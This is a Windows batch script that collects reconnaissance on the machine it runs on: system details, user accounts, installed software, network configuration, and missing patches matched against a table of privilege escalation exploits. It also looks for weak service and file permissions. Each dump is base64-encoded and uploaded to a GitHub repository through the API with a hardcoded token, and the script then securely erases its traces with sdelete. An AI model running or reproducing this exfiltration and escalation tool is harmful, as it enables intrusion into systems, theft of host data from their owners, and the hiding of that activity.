@echo off

echo.====================== DUMP ============================ > %TEMP%\dump.txt
echo.Date: %date% %time% >>%TEMP%\dump.txt
hostname >> %TEMP%\dump.txt 

echo.====================== ENVIRONMENT ==================== >> %TEMP%\dump.txt

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" >> %TEMP%\dump.txt
echo %username%%random%_envInfo.txt > %TEMP%\filename.txt
CALL :SendPayload

echo ====================== USERNAME ==================== > %TEMP%\dump.txt
echo %username% 2>NUL 1>>%TEMP%\dump.txt
echo ====================== AVAILABLE USERS ==================== >> %TEMP%\dump.txt
net users >> %TEMP%\dump.txt
echo %username%%random%_usrInfo.txt > %TEMP%\filename.txt
CALL :SendPayload

echo >> %TEMP%\dump.txt
echo ====================== INSTALLED SOFTWARE ==================== >> %TEMP%\dump.txt
wmic product get Name, Version >> %TEMP%\dump.txt
echo %username%%random%_installedSoftwareInfo.txt > %TEMP%\filename.txt
CALL :SendPayload


echo ====================== NETWORKING ==================== >> %TEMP%\dump.txt
curl http://icanhazip.com >> %TEMP%\dump.txt
ipconfig /all >> %TEMP%\dump.txt

echo ====================== ARP CACHE ==================== >> %TEMP%\dump.txt
arp -a >> %TEMP%\dump.txt

echo ====================== NETWORK CONNECTIONS ==================== >> %TEMP%\dump.txt
netstat -ano >> %TEMP%\dump.txt
net view >> %TEMP%\dump.txt

echo ====================== ROUTING CONFIG ==================== >> %TEMP%\dump.txt
route PRINT >> %TEMP%\dump.txt

echo ====================== FIREWALLS ==================== >> %TEMP%\dump.txt
netsh firewall show state >> %TEMP%\dump.txt

echo %username%%random%_networkInfo.txt > %TEMP%\filename.txt
CALL :SendPayload

echo ====================== DEVICES ====================== >> %TEMP%\dump.txt
powershell Get-PnpDevice -FriendlyName >> %TEMPT%\dump.txt
echo %username%%random%_deviceInfo.txt > %TEMP%\filename.txt
CALL :SendPayload

echo "#----------------------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "#    Exploits Index    | 2K      | XP    | 2K3   | 2K8     | Vista   | 7   |                           Title                       |">> %TEMP%\dump.txt
echo "#----------------------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB2592799 | MS11-080 |    X    | SP3   | SP3   |    X    |    X    |  X  | afd.sys                  - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB3143141 | MS16-032 |    X    |   X   |   X   | SP1/2   | SP2     | SP1 | Secondary Logon          - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB2393802 | MS11-011 |    X    | SP2/3 | SP2   | SP2     | SP1/2   | SP0 | WmiTraceMessageVa        - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB982799  | MS10-059 |    X    |   X   |   X   | ALL     | ALL     | SP0 | Chimichurri              - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB979683  | MS10-021 | SP4     | SP2/3 | SP2   | SP2     | SP0/1/2 | SP0 | Windows Kernel           - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB2305420 | MS10-092 |    X    |   X   |   X   | SP0/1/2 | SP1/2   | SP0 | Task Scheduler           - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB981957  | MS10-073 |    X    | SP2/3 | SP2   | SP2     | SP1/2   | SP0 | Keyboard Layout          - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB4013081 | MS17-017 |    X    |   X   |   X   | SP2     | SP2     | SP1 | Registry Hive Loading    - Local privilege Escalation |" >> %TEMP%\dump.txt 
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB977165  | MS10-015 | ALL     | ALL   | ALL   | ALL     | ALL     | ALL | User Mode to Ring        - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB941693  | MS08-025 | SP4     | SP2   | SP1/2 | SP0     | SP0/1   |  X  | win32k.sys               - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB920958  | MS06-049 | SP4     |   X   |   X   |    X    |    X    |  X  | ZwQuerySysInfo           - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB914389  | MS06-030 | ALL     | SP2   |   X   |    X    |    X    |  X  | Mrxsmb.sys               - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB908523  | MS05-055 | SP4     |   X   |   X   |    X    |    X    |  X  | APC Data-Free            - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB890859  | MS05-018 | SP3/4   | SP1/2 |   X   |    X    |    X    |  X  | CSRSS                    - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB842526  | MS04-019 | SP2/3/4 |   X   |   X   |    X    |    X    |  X  | Utility Manager          - Local privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB835732  | MS04-011 | SP2/3/4 | SP0/1 |   X   |    X    |    X    |  X  | LSASS service BoF        - echoote Code Execution      |" >> %TEMP%\dump.txt 
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB841872  | MS04-020 | SP4     |   X   |   X   |    X    |    X    |  X  | POSIX                    - Local Privilege Escalation |" >> %TEMP%\dump.txt
echo "#----------------------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB2975684 | MS14-040 |    X    |   X   | SP2   | SP2     | SP2     | SP1 | afd.sys Dangling Pointer - Local Privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB3136041 | MS16-016 |    X    |   X   |   X   | SP1/2   | SP2     | SP1 | WebDAV to Address        - Local Privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB3057191 | MS15-051 |    X    |   X   | SP2   | SP2     | SP2     | SP1 | win32k.sys               - Local Privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt
echo "# KB2989935 | MS14-070 |    X    |   X   | SP2   |    X    |    X    |  X  | TCP/IP                   - Local Privilege Escalation |" >> %TEMP%\dump.txt
echo "#-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#" >> %TEMP%\dump.txt 


wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2592799" | find /i "KB2592799" 1>NUL
IF not errorlevel 1 (
    
  echo MS11-080 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS11-080 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3143141" | find /i "KB3143141" 1>NUL
IF not errorlevel 1 (
    
  echo MS16-032 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS16-032 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2393802" | find /i "KB2393802" 1>NUL
IF not errorlevel 1 (
    
  echo MS11-011 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS11-011 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB982799" | find /i "KB982799" 1>NUL
IF not errorlevel 1 (
    
  echo MS10-059 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS10-059 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB979683" | find /i "KB979683" 1>NUL
IF not errorlevel 1 (
    
  echo MS10-021 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS10-021 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2305420" | find /i "KB2305420" 1>NUL
IF not errorlevel 1 (
    
  echo MS10-092 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS10-092 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB981957" | find /i "KB981957" 1>NUL
IF not errorlevel 1 (
    
  echo MS10-073 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS10-073 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB4013081" | find /i "KB4013081" 1>NUL
IF not errorlevel 1 (
    
  echo MS17-017 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS17-017 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB977165" | find /i "KB977165" 1>NUL
IF not errorlevel 1 (
    
  echo MS10-015 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS10-015 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB941693" | find /i "KB941693" 1>NUL
IF not errorlevel 1 (
    
  echo MS08-025 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS08-025 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB920958" | find /i "KB920958" 1>NUL
IF not errorlevel 1 (
    
  echo MS06-049 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS06-049 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB914389" | find /i "KB914389" 1>NUL
IF not errorlevel 1 (
    
  echo MS06-030 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS06-030 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB908523" | find /i "KB908523" 1>NUL
IF not errorlevel 1 (
    
  echo MS05-055 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS05-055 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB890859" | find /i "KB890859" 1>NUL
IF not errorlevel 1 (
    
  echo MS05-018 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS05-018 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB842526" | find /i "KB842526" 1>NUL
IF not errorlevel 1 (
    
  echo MS04-019 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS04-019 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB835732" | find /i "KB835732" 1>NUL
IF not errorlevel 1 (
    
  echo MS04-011 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS04-011 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB841872" | find /i "KB841872" 1>NUL
IF not errorlevel 1 (
    
  echo MS04-020 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS04-020 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2975684" | find /i "KB2975684" 1>NUL
IF not errorlevel 1 (
    
  echo MS14-040 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS14-040 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3136041" | find /i "KB3136041" 1>NUL
IF not errorlevel 1 (
    
  echo MS16-016 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS16-016 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3057191" | find /i "KB3057191" 1>NUL
IF not errorlevel 1 (
    
  echo MS15-051 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS15-051 patch is NOT installed! >> %TEMP%\dump.txt

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2989935" | find /i "KB2989935" 1>NUL
IF not errorlevel 1 (
    
  echo MS14-070 patch is installed :( >> %TEMP%\dump.txt

) ELSE (

  echo MS14-070 patch is NOT installed! >> %TEMP%\dump.txt

)

echo %username%%random%_exploitsInfo.txt > %TEMP%\filename.txt
CALL :SendPayload


echo ========================== MSI Install - SYSTEM PRIVILEGES =============================== >> %TEMP%\dump.txt
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> %TEMP%\dump.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> %TEMP%\dump.txt
echo ============================ VULN SERVICES ============================================== >> %TEMP%\dump.txt

%TEMP%\accesschk.exe /accepteula -uwcqv "Authenticated Users" * >> %TEMP%\dump.txt
%TEMP%\accesschk.exe /accepteula -uwcqv "Power Users" * >> %TEMP%\dump.txt
%TEMP%\accesschk.exe /accepteula -uwcqv "Users" * >> %TEMP%\dump.txt

echo ============================ VULN FILE PERMISSIONS +========================================= >> %TEMP%\dump.txt
%TEMP%\accesschk.exe /accepteula -uwqs "Users" c:\*.* >> %TEMP%\dump.txt
::%TEMP%\accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.* >> %TEMP%\dump.txt

echo ============================ VULN FOLDER PERMISSIONS ========================================= >> %TEMP%\dump.txt
%TEMP%\accesschk.exe /accepteula -uwdqs "Users" c:\ >> %TEMP%\dump.txt
%TEMP%\accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\ >> %TEMP%\dump.txt

echo %username%%random%_vulnInfo.txt > %TEMP%\filename.txt
CALL :SendPayload
EXIT /B 0


:SendPayload
:: Base64 encode the output
powershell [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($(get-content "%TEMP%\dump.txt"))) > %TEMP%\shit.txt
set rnd=%random%
::SendPayload request
powershell -command "$filename=$(get-content %TEMP%\filename.txt);$shit=$(get-content %TEMP%\shit.txt);$test='curl -i -X PUT -H \"Authorization: token 0558f26b8b501a1064c1572a0edb3c84dbd404b1\" -H \"Accept: application/vnd.github.v3+json\"  https://api.github.com/repos/chrisuu11/BATMAN/contents/'+$filename+' -d \"{\\\"message\\\":\\\"Initial Commit\\\",\\\"content\\\":\\\"'+$shit+'\\\"}\"';Write-Output $test"  > %TEMP%\rnd.bat
::clean up
%TEMP%\sdelete64.exe -p 2 %TEMP%\dump.txt
%TEMP%\sdelete64.exe -p 2  %TEMP%\shit.txt
%TEMP%\sdelete64.exe -p 2  %TEMP%\filename.txt
::send request
call %TEMP%\rnd.bat
%TEMP%\sdelete64.exe -p 2  %TEMP%\rnd.bat


